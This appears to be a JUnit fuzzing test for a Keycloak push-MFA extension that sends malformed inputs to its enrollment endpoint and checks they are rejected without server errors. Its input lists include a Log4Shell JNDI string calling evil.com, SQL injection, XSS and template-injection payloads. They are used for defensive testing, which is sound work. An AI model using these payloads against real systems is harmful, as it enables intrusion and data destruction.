/*
 * Copyright 2026 Bundesagentur für Arbeit
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package de.arbeitsagentur.keycloak.push;

import static org.junit.jupiter.api.Assertions.assertTrue;

import com.fasterxml.jackson.databind.ObjectMapper;
import de.arbeitsagentur.keycloak.push.support.AdminClient;
import de.arbeitsagentur.keycloak.push.support.BrowserSession;
import de.arbeitsagentur.keycloak.push.support.ContainerLogWatcher;
import de.arbeitsagentur.keycloak.push.support.DeviceClient;
import de.arbeitsagentur.keycloak.push.support.DeviceKeyType;
import de.arbeitsagentur.keycloak.push.support.DeviceState;
import de.arbeitsagentur.keycloak.push.support.HtmlPage;
import de.arbeitsagentur.keycloak.push.util.PushMfaConstants;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.Base64;
import java.util.Random;
import java.util.stream.IntStream;
import java.util.stream.Stream;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.RepeatedTest;
import org.junit.jupiter.api.TestInstance;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.utility.MountableFile;

/**
 * Fuzzing-style tests that generate random/malformed inputs to test robustness.
 */
@Testcontainers
@ExtendWith(ContainerLogWatcher.class)
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class PushMfaFuzzIT {

    private static final ObjectMapper MAPPER = new ObjectMapper();
    private static final Path EXTENSION_JAR = locateProviderJar();
    private static final Path REALM_FILE =
            Paths.get("config", "demo-realm.json").toAbsolutePath();
    private static final String TEST_USERNAME = "fuzztest";
    private static final String TEST_PASSWORD = "fuzztest";
    private static final Random RANDOM = new Random();
    private static final int MAX_RETRIES = 3;

    @Container
    private static final GenericContainer<?> KEYCLOAK = new GenericContainer<>("quay.io/keycloak/keycloak:26.4.5")
            .withExposedPorts(8080)
            .withCopyFileToContainer(MountableFile.forHostPath(EXTENSION_JAR), "/opt/keycloak/providers/extension.jar")
            .withCopyFileToContainer(MountableFile.forHostPath(REALM_FILE), "/opt/keycloak/data/import/demo-realm.json")
            .withEnv("KEYCLOAK_ADMIN", "admin")
            .withEnv("KEYCLOAK_ADMIN_PASSWORD", "admin")
            .withCommand(
                    "start-dev --hostname=localhost --hostname-strict=false --http-enabled=true --import-realm --features=dpop")
            .waitingFor(Wait.forHttp("/realms/master").forStatusCode(200))
            .withStartupTimeout(Duration.ofMinutes(3));

    private final HttpClient http =
            HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();
    private URI baseUri;
    private AdminClient adminClient;

    @BeforeAll
    void setup() throws Exception {
        baseUri = URI.create(String.format("http://%s:%d/", KEYCLOAK.getHost(), KEYCLOAK.getMappedPort(8080)));
        adminClient = new AdminClient(baseUri);
        adminClient.ensureUser(TEST_USERNAME, TEST_PASSWORD);
    }

    @BeforeEach
    void resetConfig() throws Exception {
        adminClient.resetAccessToken();
        adminClient.configurePushMfaUserVerification(
                PushMfaConstants.USER_VERIFICATION_NONE, PushMfaConstants.DEFAULT_USER_VERIFICATION_PIN_LENGTH);
        try {
            adminClient.logoutAllSessions(TEST_USERNAME);
        } catch (Exception e) {
            // User might not have sessions
        }
    }

    private static Path locateProviderJar() {
        Path target = Paths.get("target");
        try (var files = Files.list(target)) {
            return files.filter(p -> p.getFileName().toString().matches("keycloak-push-mfa-extension-.*\\.jar"))
                    .filter(p -> !p.getFileName().toString().contains("-sources"))
                    .filter(p -> !p.getFileName().toString().contains("-javadoc"))
                    .findFirst()
                    .orElse(target.resolve("keycloak-push-mfa-extension.jar"));
        } catch (Exception e) {
            return target.resolve("keycloak-push-mfa-extension.jar");
        }
    }

    private DeviceClient enrollDeviceWithRetry() throws Exception {
        for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
            try {
                adminClient.resetAccessToken();
                adminClient.resetUserState(TEST_USERNAME);
                DeviceState state = DeviceState.create(DeviceKeyType.RSA);
                DeviceClient device = new DeviceClient(baseUri, state);
                BrowserSession session = new BrowserSession(baseUri);
                HtmlPage login = session.startAuthorization("test-app");
                HtmlPage enrollPage = session.submitLogin(login, TEST_USERNAME, TEST_PASSWORD);
                String token = session.extractEnrollmentToken(enrollPage);
                device.completeEnrollment(token);
                session.submitEnrollmentCheck(enrollPage);
                return device;
            } catch (Exception e) {
                if (attempt == MAX_RETRIES - 1) throw e;
                Thread.sleep(2000);
            }
        }
        throw new IllegalStateException("Failed to enroll device after retries");
    }

    private URI realmUri() {
        return baseUri.resolve("/realms/demo/");
    }

    // ==================== Malformed JWT Fuzzing ====================

    @Nested
    @DisplayName("Malformed JWT Fuzzing")
    class MalformedJwtFuzzing {

        static Stream<String> malformedJwts() {
            return Stream.of(
                    "",
                    ".",
                    "..",
                    "...",
                    "a.b.c",
                    "eyJ.eyJ.sig",
                    Base64.getUrlEncoder().encodeToString("{}".getBytes()) + "..",
                    ".." + Base64.getUrlEncoder().encodeToString("sig".getBytes()),
                    "eyJhbGciOiJub25lIn0.eyJ0ZXN0IjoxfQ.",
                    "eyJhbGciOiJIUzI1NiJ9.eyJ0ZXN0IjoxfQ.invalidsig",
                    "null",
                    "undefined",
                    "true",
                    "false",
                    "[]",
                    "{}",
                    "<xml>test</xml>",
                    "${jndi:ldap://evil.com/a}",
                    "{{7*7}}",
                    "' OR '1'='1",
                    "; DROP TABLE users;--");
        }

        @ParameterizedTest
        @MethodSource("malformedJwts")
        @DisplayName("Malformed JWT in enrollment rejected safely")
        void malformedJwtInEnrollmentRejected(String malformedJwt) throws Exception {
            HttpRequest request = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString("{\"token\":\"" + escapeJson(malformedJwt) + "\"}"))
                    .build();

            HttpResponse<String> response = http.send(request, HttpResponse.BodyHandlers.ofString());

            assertTrue(response.statusCode() >= 400, "Malformed JWT should be rejected: " + malformedJwt);
            assertNoServerError(response);
        }
    }

    // ==================== Random String Fuzzing ====================

    @Nested
    @DisplayName("Random String Fuzzing")
    class RandomStringFuzzing {

        @RepeatedTest(5)
        @DisplayName("Random bytes in token field handled safely")
        void randomBytesInTokenHandled() throws Exception {
            byte[] randomBytes = new byte[RANDOM.nextInt(500) + 1];
            RANDOM.nextBytes(randomBytes);
            String randomToken = Base64.getUrlEncoder().encodeToString(randomBytes);

            HttpRequest request = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString("{\"token\":\"" + randomToken + "\"}"))
                    .build();

            HttpResponse<String> response = http.send(request, HttpResponse.BodyHandlers.ofString());
            assertTrue(response.statusCode() >= 400, "Random bytes should be rejected");
            assertNoServerError(response);
        }
    }

    // ==================== Special Character Fuzzing ====================

    @Nested
    @DisplayName("Special Character Fuzzing")
    class SpecialCharacterFuzzing {

        static Stream<String> specialStrings() {
            return Stream.of(
                    "\u0000",
                    "\n\r",
                    "\t",
                    "\\",
                    "\"",
                    "'",
                    "<script>alert(1)</script>",
                    "javascript:alert(1)",
                    "${7*7}",
                    "{{7*7}}",
                    "#{7*7}",
                    "%00",
                    "%0a",
                    "%0d");
        }

        @ParameterizedTest
        @MethodSource("specialStrings")
        @DisplayName("Special characters in JSON body handled safely")
        void specialCharsInBodyHandled(String special) throws Exception {
            String escaped = escapeJson(special);
            HttpRequest request = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString("{\"token\":\"" + escaped + "\"}"))
                    .build();

            HttpResponse<String> response = http.send(request, HttpResponse.BodyHandlers.ofString());
            assertNoServerError(response);
        }
    }

    // ==================== Boundary Testing ====================

    @Nested
    @DisplayName("Boundary Testing")
    class BoundaryTesting {

        @ParameterizedTest
        @ValueSource(ints = {0, 1, 100, 1000, 10000})
        @DisplayName("Various token lengths handled safely")
        void variousTokenLengthsHandled(int length) throws Exception {
            String token = length == 0 ? "" : generateAlphanumeric(length);

            HttpRequest request = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString("{\"token\":\"" + token + "\"}"))
                    .build();

            HttpResponse<String> response = http.send(request, HttpResponse.BodyHandlers.ofString());
            assertNoServerError(response);
        }

        static Stream<Integer> jsonNestingDepths() {
            return IntStream.of(1, 10, 50, 100).boxed();
        }

        @ParameterizedTest
        @MethodSource("jsonNestingDepths")
        @DisplayName("Deeply nested JSON handled safely")
        void deeplyNestedJsonHandled(int depth) throws Exception {
            StringBuilder json = new StringBuilder();
            for (int i = 0; i < depth; i++) {
                json.append("{\"nested\":");
            }
            json.append("\"value\"");
            for (int i = 0; i < depth; i++) {
                json.append("}");
            }

            HttpRequest request = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json.toString()))
                    .build();

            HttpResponse<String> response = http.send(request, HttpResponse.BodyHandlers.ofString());
            assertNoServerError(response);
        }
    }

    // ==================== Content-Type Fuzzing ====================

    @Nested
    @DisplayName("Content-Type Fuzzing")
    class ContentTypeFuzzing {

        static Stream<String> contentTypes() {
            return Stream.of(
                    "text/plain",
                    "text/html",
                    "application/xml",
                    "application/x-www-form-urlencoded",
                    "multipart/form-data",
                    "application/octet-stream",
                    "image/png",
                    "application/json; charset=utf-8",
                    "APPLICATION/JSON",
                    "application/JSON",
                    "",
                    "invalid");
        }

        @ParameterizedTest
        @MethodSource("contentTypes")
        @DisplayName("Various Content-Types handled without crashing")
        void variousContentTypesHandled(String contentType) throws Exception {
            HttpRequest.Builder builder = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .POST(HttpRequest.BodyPublishers.ofString("{\"token\":\"test\"}"));

            if (!contentType.isEmpty()) {
                builder.header("Content-Type", contentType);
            }

            try {
                HttpResponse<String> response = http.send(builder.build(), HttpResponse.BodyHandlers.ofString());
                // Server responded - that's what we're testing
                assertTrue(response.statusCode() > 0, "Server should respond to request");
            } catch (Exception e) {
                // Some content types may cause request issues - that's acceptable
            }
        }
    }

    // ==================== HTTP Method Fuzzing ====================

    @Nested
    @DisplayName("HTTP Method Fuzzing")
    class HttpMethodFuzzing {

        @ParameterizedTest
        @ValueSource(strings = {"GET", "PUT", "DELETE", "PATCH", "HEAD"})
        @DisplayName("Wrong HTTP methods rejected for enrollment")
        void wrongMethodsRejectedForEnrollment(String method) throws Exception {
            HttpRequest request = HttpRequest.newBuilder(realmUri().resolve("push-mfa/enroll/complete"))
                    .header("Content-Type", "application/json")
                    .method(
                            method,
                            method.equals("GET") || method.equals("HEAD") || method.equals("DELETE")
                                    ? HttpRequest.BodyPublishers.noBody()
                                    : HttpRequest.BodyPublishers.ofString("{\"token\":\"test\"}"))
                    .build();

            HttpResponse<String> response = http.send(request, HttpResponse.BodyHandlers.ofString());

            assertTrue(
                    response.statusCode() == 405 || response.statusCode() >= 400,
                    "Wrong method " + method + " should be rejected");
        }
    }

    // ==================== Helper Methods ====================

    private void assertNoServerError(HttpResponse<String> response) {
        assertTrue(
                response.statusCode() < 500,
                "Server should not return 5xx error. Status: " + response.statusCode() + ", Body: " + response.body());
    }

    private String generateAlphanumeric(int length) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(RANDOM.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private String escapeJson(String input) {
        if (input == null) return "";
        return input.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    private String urlEncode(String value) {
        return URLEncoder.encode(value, StandardCharsets.UTF_8);
    }
}
